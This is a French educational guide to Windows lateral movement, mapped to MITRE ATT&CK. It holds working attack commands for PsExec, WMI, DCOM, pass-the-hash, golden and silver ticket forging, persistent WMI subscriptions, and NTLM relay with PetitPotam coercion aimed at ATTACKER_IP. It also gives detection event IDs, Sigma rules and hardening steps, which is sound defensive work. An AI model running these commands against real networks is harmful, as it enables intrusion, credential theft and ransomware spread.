# 🦠 Techniques de Propagation / Lateral Movement

> **Documentation éducative** : Comprendre les techniques de mouvement latéral pour mieux les détecter et s'en protéger.

---

## 📋 Table des matières

1. [Vue d'ensemble](#vue-densemble)
2. [Techniques Tier 1 - Classiques](#-tier-1--techniques-classiques)
3. [Techniques Tier 2 - Avancées](#-tier-2--techniques-avancées)
4. [Techniques Tier 3 - Fileless](#-tier-3--techniques-fileless)
5. [Détection](#-détection)
6. [Protection](#️-protection)
7. [Tendances actuelles](#-tendances-2024-2025)

---

## Vue d'ensemble

### MITRE ATT&CK : Lateral Movement (TA0008)

```
┌─────────────────────────────────────────────────────────────────────┐
│                    LATERAL MOVEMENT FLOW                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌─────────────┐      ┌─────────────┐      ┌─────────────┐         │
│  │   Machine   │ ───► │   Machine   │ ───► │   Machine   │         │
│  │   Initiale  │      │   Cible 1   │      │   Cible 2   │         │
│  │  (Patient 0)│      │             │      │             │         │
│  └─────────────┘      └─────────────┘      └─────────────┘         │
│        │                    │                    │                  │
│        ▼                    ▼                    ▼                  │
│  Credential            Credential           Credential              │
│  Discovery             Reuse                Reuse                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Prérequis communs

| Prérequis | Description |
|-----------|-------------|
| **Credentials** | Hash NTLM, ticket Kerberos, ou mot de passe |
| **Accès réseau** | Ports SMB (445), WMI (135), WinRM (5985), RDP (3389) |
| **Privilèges** | Généralement admin local sur la cible |

---

## 🔥 Tier 1 : Techniques classiques

### 1. PsExec / SMB + Named Pipes

**Fonctionnement :**
```
1. Connexion SMB (port 445) avec credentials valides
2. Copie d'un binaire via SMB (ADMIN$, C$)
3. Création d'un service distant via SCM
4. Le service exécute le payload
5. Suppression du service
```

| Aspect | Détails |
|--------|---------|
| **Prérequis** | Admin local sur cible, SMB ouvert (445) |
| **Avantages** | Natif Windows, très fiable |
| **Inconvénients** | Très surveillé, laisse des traces |
| **Détection** | Event 7045 (service créé), Sysmon Event 1 |
| **Utilisé par** | Ransomware (Ryuk, Conti), APT |

**Commandes :**
```powershell
# PsExec classique
psexec.exe \\TARGET -u DOMAIN\admin -p password cmd.exe

# PowerShell (Invoke-PsExec)
Invoke-PsExec -ComputerName TARGET -Command "C:\payload.exe"

# Impacket (Linux)
psexec.py DOMAIN/admin:password@TARGET
```

---

### 2. WMI (Windows Management Instrumentation)

**Fonctionnement :**
```
1. Connexion WMI (DCOM port 135, puis port dynamique)
2. Création d'un processus via Win32_Process.Create()
3. Exécution distante sans copie de fichier
```

| Aspect | Détails |
|--------|---------|
| **Prérequis** | Admin local, WMI accessible |
| **Avantages** | Pas de fichier déposé, natif |
| **Inconvénients** | Ports DCOM complexes |
| **Détection** | Event 4688, WMI-Activity logs |
| **Utilisé par** | APT29, FIN7, nombreux ransomware |

**Commandes :**
```powershell
# wmic
wmic /node:TARGET /user:DOMAIN\admin process call create "cmd.exe /c payload.exe"

# PowerShell
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c C:\payload.exe"

# CIM (moderne)
Invoke-CimMethod -ComputerName TARGET -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}

# Impacket
wmiexec.py DOMAIN/admin:password@TARGET
```

---

### 3. WinRM / PowerShell Remoting

**Fonctionnement :**
```
1. Connexion WinRM (port 5985 HTTP / 5986 HTTPS)
2. Session PowerShell distante
3. Exécution de commandes/scripts
```

| Aspect | Détails |
|--------|---------|
| **Prérequis** | WinRM activé, admin local |
| **Avantages** | Chiffré (HTTPS), flexible |
| **Inconvénients** | Souvent désactivé |
| **Détection** | Event 4688, PowerShell logging |
| **Utilisé par** | Cobalt Strike, APT |

**Commandes :**
```powershell
# Session interactive
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\admin

# Exécution de commande
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }

# Exécuter un script local sur la cible
Invoke-Command -ComputerName TARGET -FilePath C:\payload.ps1

# Sur plusieurs machines
Invoke-Command -ComputerName SRV1,SRV2,SRV3 -ScriptBlock { hostname }

# Impacket
evil-winrm -i TARGET -u admin -p password
```

---

### 4. RDP (Remote Desktop Protocol)

**Fonctionnement :**
```
1. Connexion RDP (port 3389)
2. Session graphique complète
3. Actions manuelles ou automatisées
```

| Aspect | Détails |
|--------|---------|
| **Prérequis** | RDP activé, credentials valides |
| **Avantages** | Légitime, difficile à distinguer |
| **Inconvénients** | Lent, session visible |
| **Détection** | Event 4624 (Type 10), Event 1149 |
| **Utilisé par** | Ransomware ops, accès initial |

**Commandes :**
```powershell
# Activer RDP à distance (si admin)
Invoke-Command -ComputerName TARGET -ScriptBlock {
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
}

# Connexion
mstsc /v:TARGET

# SharpRDP (automatisé)
SharpRDP.exe computername=TARGET command="C:\payload.exe" username=DOMAIN\admin password=pass
```

---

### 5. Pass-the-Hash (PtH)

**Fonctionnement :**
```
1. Récupérer le hash NTLM (Mimikatz, secretsdump)
2. Utiliser le hash directement pour s'authentifier
3. Pas besoin du mot de passe en clair
```

| Aspect | Détails |
|--------|---------|
| **Prérequis** | Hash NTLM, compte local ou domain |
| **Avantages** | Pas de cracking nécessaire |
| **Inconvénients** | Détectable par comportement |
| **Détection** | Event 4624 avec LogonType 9, NTLM usage |
| **Utilisé par** | Presque tous les acteurs |

**Commandes :**
```
# Mimikatz
sekurlsa::pth /user:admin /domain:WORKGROUP /ntlm:HASH /run:cmd.exe

# Impacket (wmiexec, psexec, smbexec)
psexec.py -hashes :NTLM_HASH DOMAIN/admin@TARGET

# CrackMapExec
crackmapexec smb TARGET -u admin -H NTLM_HASH
```

---

## 🎯 Tier 2 : Techniques avancées

### 6. Pass-the-Ticket / Kerberos Attacks

| Variante | Description | Prérequis |
|----------|-------------|-----------|
| **Pass-the-Ticket** | Réutiliser un ticket TGT/TGS volé | Ticket valide |
| **Overpass-the-Hash** | Hash NTLM → demander un TGT | Hash NTLM |
| **Golden Ticket** | Forger un TGT illimité | Hash krbtgt |
| **Silver Ticket** | Forger un TGS pour un service | Hash du service |

**Commandes :**
```
# Pass-the-Ticket
mimikatz# kerberos::ptt ticket.kirbi

# Overpass-the-Hash
mimikatz# sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:cmd.exe

# Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket
mimikatz# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

### 7. DCOM (Distributed COM)

**Fonctionnement :**
```
1. Instancier un objet COM distant
2. Utiliser ses méthodes pour exécuter du code
3. Plusieurs objets exploitables
```

| Aspect | Détails |
|--------|---------|
| **Prérequis** | Admin local, DCOM accessible |
| **Avantages** | Moins surveillé que WMI/PSExec |
| **Inconvénients** | Ports dynamiques |
| **Détection** | DCOM événements, process creation |

**Objets exploitables :**
```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")

# ShellBrowserWindow
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","","",0)

# Excel.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","TARGET"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c calc.exe")
```

---

### 8. Scheduled Tasks distantes

| Aspect | Détails |
|--------|---------|
| **Prérequis** | Admin local, Task Scheduler accessible |
| **Avantages** | Persistance incluse |
| **Inconvénients** | Traces dans Event Log |
| **Détection** | Event 4698 (task created) |

**Commandes :**
```powershell
# Création distante
schtasks /create /s TARGET /u DOMAIN\admin /p password /tn "Update" /tr "C:\payload.exe" /sc once /st 00:00 /ru SYSTEM

# Exécution immédiate
schtasks /run /s TARGET /tn "Update"

# Suppression
schtasks /delete /s TARGET /tn "Update" /f

# Via PowerShell
Invoke-Command -ComputerName TARGET -ScriptBlock {
    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c payload.exe"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
    Register-ScheduledTask -TaskName "Update" -Action $action -Trigger $trigger -User "SYSTEM"
}
```

---

### 9. Services distants (sc.exe)

**Sans création de fichier :**
```powershell
# Modifier un service existant temporairement
sc \\TARGET config "SensorService" binpath= "cmd.exe /c payload.exe"
sc \\TARGET start "SensorService"
sc \\TARGET config "SensorService" binpath= "C:\Windows\System32\SensorService.dll"  # Restaurer

# Créer un nouveau service
sc \\TARGET create "EvilSvc" binpath= "C:\Windows\Temp\payload.exe"
sc \\TARGET start "EvilSvc"
sc \\TARGET delete "EvilSvc"
```

---

### 10. SSH (Windows 10+)

| Aspect | Détails |
|--------|---------|
| **Prérequis** | OpenSSH Server activé (port 22) |
| **Avantages** | Chiffré, moins surveillé sur Windows |
| **Inconvénients** | Rarement activé |
| **Détection** | SSH logs, process creation |

```powershell
# Vérifier si disponible
Test-NetConnection -ComputerName TARGET -Port 22

# Connexion
ssh admin@TARGET

# Exécution de commande
ssh admin@TARGET "whoami"
```

---

## 👻 Tier 3 : Techniques fileless

### 11. WMI Event Subscription

**Persistance + exécution sans fichier :**
```powershell
# Créer une subscription WMI persistante
$filterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = 'EvilFilter'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'cmd.exe /c payload.exe'
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
```

### 12. NTLM Relay

```
Fonctionnement:
1. Intercepter une authentification NTLM
2. La relayer vers une autre machine
3. Accès avec les droits de la victime
```

**Outils :**
```bash
# Responder (capture)
responder -I eth0 -wrf

# ntlmrelayx (relay)
ntlmrelayx.py -t TARGET -smb2support -c "whoami"

# Avec coercion (PetitPotam, PrinterBug)
python3 PetitPotam.py ATTACKER_IP TARGET_DC
```

### 13. Remote Thread Injection

```c
// Combiné avec WMI/DCOM pour trigger
// 1. OpenProcess sur process distant
// 2. VirtualAllocEx
// 3. WriteProcessMemory
// 4. CreateRemoteThread
```

---

## 🔍 Détection

### Événements Windows clés

```
Authentication:
├── 4624 : Successful logon
│   ├── Type 2  : Interactive (local)
│   ├── Type 3  : Network (SMB, WMI)
│   ├── Type 9  : NewCredentials (PtH indicator)
│   └── Type 10 : RemoteInteractive (RDP)
├── 4625 : Failed logon
├── 4648 : Explicit credential use
└── 4672 : Special privileges assigned

Process/Service:
├── 4688 : Process creation
├── 7045 : Service installed
└── 7036 : Service state change

Scheduled Tasks:
├── 4698 : Scheduled task created
├── 4699 : Scheduled task deleted
└── 4702 : Scheduled task updated

Kerberos:
├── 4768 : TGT requested
├── 4769 : TGS requested
└── 4771 : Kerberos pre-auth failed
```

### Matrice de détection par technique

| Technique | Event Windows | Sysmon | EDR | Network |
|-----------|--------------|--------|-----|---------|
| PsExec | 7045, 4688 | Event 1, 11, 13 | ✅ High | SMB 445 |
| WMI | 4688, WMI logs | Event 1, 20, 21 | ✅ High | DCOM 135+ |
| WinRM | 4688, PS logs | Event 1 | ✅ Medium | 5985/5986 |
| RDP | 4624 (Type 10) | Event 1 | 🔶 Medium | 3389 |
| PtH | 4624 (Type 9) | Event 10 | ✅ High | NTLM |
| DCOM | 4688 | Event 1 | 🔶 Medium | DCOM 135+ |
| Schtasks | 4698 | Event 1 | ✅ High | RPC |

### Règles Sigma

```yaml
# PsExec Detection
title: PsExec Service Installation
status: experimental
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
        ServiceName|contains: 'PSEXE'
    condition: selection
level: high

---
# WMI Remote Execution
title: WMI Remote Process Creation
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        ParentImage|endswith: '\WmiPrvSE.exe'
    filter:
        Image|endswith:
            - '\WerFault.exe'
    condition: selection and not filter
level: medium

---
# Pass-the-Hash Detection
title: Pass-the-Hash Activity
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 9
        LogonProcessName: 'seclogo'
    condition: selection
level: high

---
# DCOM Lateral Movement
title: DCOM Lateral Movement
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        ParentImage|endswith: '\svchost.exe'
        ParentCommandLine|contains: 'DcomLaunch'
    filter:
        Image|endswith:
            - '\RuntimeBroker.exe'
            - '\explorer.exe'
    condition: selection and not filter
level: medium
```

### Indicateurs réseau

```
┌─────────────────────────────────────────────────────────────┐
│              Network Detection Indicators                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SMB (445/tcp):                                             │
│  ├── Connexions inhabituelles entre workstations            │
│  ├── Accès aux shares ADMIN$, C$, IPC$                      │
│  └── Création de fichiers .exe dans ADMIN$                  │
│                                                             │
│  WMI/DCOM (135/tcp + dynamic):                              │
│  ├── Pic de connexions RPC                                  │
│  └── Connexions 135 suivies de ports hauts                  │
│                                                             │
│  WinRM (5985/5986):                                         │
│  ├── Connexions entre workstations                          │
│  └── Patterns de commandes PowerShell                       │
│                                                             │
│  RDP (3389/tcp):                                            │
│  ├── Connexions depuis serveurs vers workstations           │
│  └── Heures inhabituelles                                   │
│                                                             │
│  Kerberos (88/tcp):                                         │
│  ├── Anomalies TGT (lifetime, encryption)                   │
│  ├── Golden ticket: TGT sans AS-REQ préalable               │
│  └── RC4 usage (downgrade attack)                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🛡️ Protection

### Hardening Windows

```powershell
# 1. Désactiver WMI distant (si non nécessaire)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM" -Name "AllowAnonymousCallback" -Value 0

# 2. Désactiver PSRemoting
Disable-PSRemoting -Force

# 3. Désactiver RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 1

# 4. Activer SMB signing (empêche NTLM relay)
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# 5. Restreindre admin shares
# Désactiver C$, ADMIN$ pour les workstations
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "AutoShareWks" -Value 0

# 6. Configurer LAPS (Local Administrator Password Solution)
# Chaque machine a un mot de passe admin local unique

# 7. Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members "sensitive_admin"
# Empêche credential caching, force Kerberos AES
```

### Segmentation réseau

```
┌─────────────────────────────────────────────────────────────┐
│                 Network Segmentation                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Tier 0 (Domain Controllers):                               │
│  ├── Accès uniquement depuis Tier 0 PAWs                    │
│  ├── Bloquer SMB/RDP depuis workstations                    │
│  └── Admin accounts dédiés                                  │
│                                                             │
│  Tier 1 (Servers):                                          │
│  ├── Accès depuis jump servers uniquement                   │
│  ├── Pas d'accès direct depuis Tier 2                       │
│  └── Admin accounts séparés                                 │
│                                                             │
│  Tier 2 (Workstations):                                     │
│  ├── Pas de connexion latérale entre workstations           │
│  ├── Bloquer ports 445, 135, 5985, 3389 entre WS            │
│  └── Firewall Windows host-based                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Credential Guard

```powershell
# Activer Credential Guard (empêche extraction mémoire)
# Nécessite UEFI Secure Boot, TPM recommandé

# Via PowerShell
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard"
Set-ItemProperty -Path $regPath -Name "EnableVirtualizationBasedSecurity" -Value 1
Set-ItemProperty -Path $regPath -Name "RequirePlatformSecurityFeatures" -Value 3

# Vérifier
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

---

## 📈 Tendances 2024-2025

### Techniques en vogue

| Tendance | Description |
|----------|-------------|
| **Living Off the Land** | Utiliser uniquement des outils natifs Windows |
| **DCOM over PsExec** | Moins détecté que PsExec |
| **SSH Windows** | De plus en plus courant, moins surveillé |
| **Cloud lateral** | Azure AD, O365, AWS IAM |
| **Container escape** | Docker, Kubernetes pivoting |
| **Supply chain** | Compromis SCCM, Intune, GPO |

### Efficacité vs Détection

```
                    EFFICACITÉ
                        ▲
                        │
         High ──────────┼─────────────────────────
                        │            ○ DCOM
                        │     ○ WMI      ○ Schtasks
                        │  ○ WinRM
                        │                    ○ PsExec
         Medium ────────┼─────────────────────────
                        │        ○ RDP
                        │  ○ SSH
                        │
         Low ───────────┼─────────────────────────
                        │
                        └──────────────────────────► DÉTECTION
                           Low     Medium    High
```

### Exemple de chaîne d'attaque moderne

```
1. Initial Access
   └── Phishing → macro → Cobalt Strike beacon

2. Discovery
   ├── net view /domain
   ├── BloodHound (mapper AD)
   └── Identifier cibles de valeur

3. Credential Access
   ├── Mimikatz → hashes/tickets
   ├── Kerberoasting
   └── DCSync si Domain Admin

4. Lateral Movement
   ├── DCOM vers serveurs (moins détecté)
   ├── WMI pour déploiement silencieux
   └── PtH/PtT pour authentification

5. Privilege Escalation
   └── Local → Domain Admin

6. Persistence
   ├── Golden Ticket
   └── Scheduled Tasks

7. Objective
   ├── Ransomware via PsExec/WMI
   └── Exfiltration via HTTPS
```

---

## 📚 Références

- [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [Impacket Tools](https://github.com/SecureAuthCorp/impacket)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
- [Sigma Rules](https://github.com/SigmaHQ/sigma)
- [Microsoft Lateral Movement Detection](https://docs.microsoft.com/en-us/advanced-threat-analytics/suspicious-activity-guide)

---

*Document créé pour ShadowLink - Projet éducatif uniquement*
